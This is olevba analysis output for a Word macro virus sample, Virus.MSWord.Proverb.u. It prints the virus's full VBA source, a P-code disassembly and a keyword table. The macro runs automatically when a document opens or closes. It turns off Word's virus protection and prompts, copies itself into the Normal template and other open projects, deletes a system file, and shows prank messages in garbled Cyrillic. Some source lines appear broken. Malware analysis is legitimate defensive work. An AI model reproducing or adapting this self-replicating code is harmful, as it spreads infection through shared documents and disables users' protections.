olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Proverb.u
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Proverb.u - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
For I = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(I, 1)
Print #1, a
Next I
Close #1

If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
I = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines I, a
I = I + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub



Private Sub Document_Open()
On Error Resume Next
    With Options
        .SaveNormalPrompt = False
        .VirusProtection = False
    End With
Dim I%, j%, k As Long, m As Boolean
Application.OnTime When:=Now + TimeValue("00:" & Format(Int(Rnd * 5) + 1, "00") & ":00"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
For I = 1 To VBE.VBProjects.Count
 For j = 1 To VBE.VBProjects(I).VBComponents.Count
  With VBE.VBProjects(I).VBComponents(j).CodeModule
     If .CountOfLines < 50 Then
     .deletelines 1, .CountOfLines
     Err.Clear
      .AddFromString Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(1, Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfLines)
      If Err = 0 Then
        m = False
        For k = .CountOfLines To .CountOfLines - 20 Step -1
           If .Find("Sub OnTimer", k, 1, k, 30) Then m = True: Exit For
        Next
        If m Then
            .deletelines k
            .InsertLines k, IIf(VBE.VBProjects(I).Name = "Normal", "Sub OnTimer()", "Private Sub OnTimer1()")
        End If
      Else
      Application.OnTime When:=Now + TimeValue("00:00:10"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
      End If
     End If
  End With
 Next
Next
End Sub
Private Sub ShowMess()
On Error Resume Next
If Left(Application.Version, 1) = "8" Then
  ShVer8
Else
 If MsgBox(GetMess(), vbOKCancel, Choose(Int(Rnd * 9) + 1, "Ñ 1 Àïðåëÿ Âàñ!", "Îïà?-Óãó!", "À âîò è ñåãîäíÿøíèé ïðèêîë", "Word: Ýòî ÿ áóêâàëüíî òîëüêî ÷òî ïðèäóìàë", "õå-õå", "Word: Ýòî ÿ â Ðóññêîì ðàäèî óñëûøàë", "Ðåêëàìíàÿ ñëóæáà Microsoft Word", "Word: Çàäîëáàëè ìåíÿ ýòè ìàêðîâèðóñû", "Âîò Âàì," & Application.UserName, "Ïîñëåäíèé ïðèêîë ñåçîíà", "Word: Îé, ñåé÷àñ îïèñàþñü...")) = 1 Then ShowMess
End If
End Sub
Private Sub ShVer8()
 On Error Resume Next
 Assistant.Visible = True
 Dim bln As Balloon
 Set bln = Assistant.NewBalloon
 With bln
  .Mode = msoModeAutoDown
  .Heading = GetMess()
  .Animation = Int(Rnd * (117))
  .Button = msoButtonSetNextClose
  .Text = Choose(Int(Rnd * 14) + 1, & Application.UserName & Space(100) & Assistant.Name, "Îïà?-Óãó!", "", "", "óìðó îò ñìåõà", "ïðàâäà ñìåøíî", "À âîò è ñåãîäíÿøíèé ïðèêîë", Assistant.Name & ": Ýòî ÿ áóêâàëüíî òîëüêî ÷òî ïðèäóìàë", Assistant.Name & ": Îé, ñåé÷àñ îïèñàþñü...", "õå-õå", Assistant.Name & ": Ýòî ÿ â Ðóññêîì ðàäèî óñëûøàë", "Ðåêëàìíàÿ ñëóæáà Microsoft Word", Assistant.Name & ": Çàäîëáàëè ìåíÿ ýòè ìàêðîâèðóñû", "Âîò Âàì," & Application.UserName, "Ïîñëåäíèé ïðèêîë ñåçîíà")
  If .Show = -6 Then ShowMess
 End With
 Assistant.Animation = 0
End Sub
Private Function GetMess()
On Error Resume Next
GetMess = Mid(Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(Int(Rnd * Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfDeclarationLines) + 1, 1), 2)
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Proverb.u
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12323 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #3:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #5:
' 	ArgsCall Read 0x0000 
' Line #6:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #7:
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #8:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' Line #9:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #11:
' Line #12:
' 	LitStr 0x000C "c:\class.sys"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "c:\class.sys"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #13:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	IfBlock 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #15:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	ElseIfBlock 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #17:
' 	ElseBlock 
' Line #18:
' 	LitStr 0x0000 ""
' 	St t 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #21:
' 	LitDI2 0x0001 
' 	St I 
' Line #22:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #23:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #24:
' 	Ld I 
' 	Ld a 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #25:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #26:
' 	Loop 
' Line #27:
' 	Label q 
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #29:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x000B "Ethan Frome"
' 	MemStWith Title 
' 	BoS 0x0000 
' 	LitStr 0x0008 "EW/LN/CB"
' 	MemStWith Author 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Ethan"
' 	MemStWith Keywords 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' 	EndIf 
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #33:
' 	EndSub 
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' 	FuncDefn (Private Sub Document_Open())
' Line #38:
' 	OnError (Resume Next) 
' Line #39:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #40:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #41:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #42:
' 	EndWith 
' Line #43:
' 	Dim 
' 	VarDefn I
' 	VarDefn j
' 	VarDefn k (As Long)
' 	VarDefn m (As Boolean)
' Line #44:
' 	Ld Now 
' 	LitStr 0x0003 "00:"
' 	Ld Rnd 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0002 "00"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitStr 0x0003 ":00"
' 	Concat 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	MemLd New 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0008 ".OnTimer"
' 	Concat 
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #45:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	MemLd VBProjects 
' 	MemLd Count 
' 	For 
' Line #46:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld I 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #47:
' 	StartWithExpr 
' 	Ld j 
' 	Ld I 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #48:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0032 
' 	Lt 
' 	IfBlock 
' Line #49:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #50:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #52:
' 	Ld Err 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #53:
' 	LitVarSpecial (False)
' 	St m 
' Line #54:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	MemLdWith CountOfLines 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0014 
' 	Sub 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #55:
' 	LitStr 0x000B "Sub OnTimer"
' 	Ld k 
' 	LitDI2 0x0001 
' 	Ld k 
' 	LitDI2 0x001E 
' 	ArgsMemLdWith Find 0x0005 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St m 
' 	BoS 0x0000 
' 	ExitFor 
' 	EndIf 
' Line #56:
' 	StartForVariable 
' 	Next 
' Line #57:
' 	Ld m 
' 	IfBlock 
' Line #58:
' 	Ld k 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #59:
' 	Ld k 
' 	Ld I 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Normal"
' 	Eq 
' 	LitStr 0x000D "Sub OnTimer()"
' 	LitStr 0x0016 "Private Sub OnTimer1()"
' 	ArgsLd IIf 0x0003 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:10"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	MemLd New 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0008 ".OnTimer"
' 	Concat 
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	EndWith 
' Line #66:
' 	StartForVariable 
' 	Next 
' Line #67:
' 	StartForVariable 
' 	Next 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Private Sub ShowMess())
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' 	Ld Application 
' 	MemLd Version 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	IfBlock 
' Line #72:
' 	ArgsCall ShVer8 0x0000 
' Line #73:
' 	ElseBlock 
' Line #74:
' 	ArgsLd GetMess 0x0000 
' 	Ld vbOKCancel 
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x000F "Ñ 1 Àïðåëÿ Âàñ!"
' 	LitStr 0x0009 "Îïà?-Óãó!"
' 	LitStr 0x001A "À âîò è ñåãîäíÿøíèé ïðèêîë"
' 	LitStr 0x0029 "Word: Ýòî ÿ áóêâàëüíî òîëüêî ÷òî ïðèäóìàë"
' 	LitStr 0x0005 "õå-õå"
' 	LitStr 0x0023 "Word: Ýòî ÿ â Ðóññêîì ðàäèî óñëûøàë"
' 	LitStr 0x001F "Ðåêëàìíàÿ ñëóæáà Microsoft Word"
' 	LitStr 0x0024 "Word: Çàäîëáàëè ìåíÿ ýòè ìàêðîâèðóñû"
' 	LitStr 0x0008 "Âîò Âàì,"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0017 "Ïîñëåäíèé ïðèêîë ñåçîíà"
' 	LitStr 0x001C "Word: Îé, ñåé÷àñ îïèñàþñü..."
' 	ArgsLd Choose 0x000C 
' 	ArgsLd MsgBox 0x0003 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall ShowMess 0x0000 
' 	EndIf 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Private Sub ShVer8())
' Line #78:
' 	OnError (Resume Next) 
' Line #79:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #80:
' 	Dim 
' 	VarDefn bln (As Balloon)
' Line #81:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set bln 
' Line #82:
' 	StartWithExpr 
' 	Ld bln 
' 	With 
' Line #83:
' 	Ld msoModeAutoDown 
' 	MemStWith Mode 
' Line #84:
' 	ArgsLd GetMess 0x0000 
' 	MemStWith Heading 
' Line #85:
' 	Ld Rnd 
' 	LitDI2 0x0075 
' 	Paren 
' 	Mul 
' 	FnInt 
' 	MemStWith Animation 
' Line #86:
' 	Ld msoButtonSetNextClose 
' 	MemStWith Button 
' Line #87:
' 	Reparse 0x01E8 "  .Text = Choose(Int(Rnd * 14) + 1, & Application.UserName & Space(100) & Assistant.Name, "Îïà?-Óãó!", "", "", "óìðó îò ñìåõà", "ïðàâäà ñìåøíî", "À âîò è ñåãîäíÿøíèé ïðèêîë", Assistant.Name & ": Ýòî ÿ áóêâàëüíî òîëüêî ÷òî ïðèäóìàë", Assistant.Name & ": Îé, ñåé÷àñ îïèñàþñü...", "õå-õå", Assistant.Name & ": Ýòî ÿ â Ðóññêîì ðàäèî óñëûøàë", "Ðåêëàìíàÿ ñëóæáà Microsoft Word", Assistant.Name & ": Çàäîëáàëè ìåíÿ ýòè ìàêðîâèðóñû", "Âîò Âàì," & Application.UserName, "Ïîñëåäíèé ïðèêîë ñåçîíà")"
' Line #88:
' 	MemLdWith Show 
' 	LitDI2 0x0006 
' 	UMi 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall ShowMess 0x0000 
' 	EndIf 
' Line #89:
' 	EndWith 
' Line #90:
' 	LitDI2 0x0000 
' 	Ld Assistant 
' 	MemSt Animation 
' Line #91:
' 	EndSub 
' Line #92:
' 	FuncDefn (Private Function GetMess(id_FFFE As Variant))
' Line #93:
' 	OnError (Resume Next) 
' Line #94:
' 	Ld Rnd 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfDeclarationLines 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St GetMess 
' Line #95:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

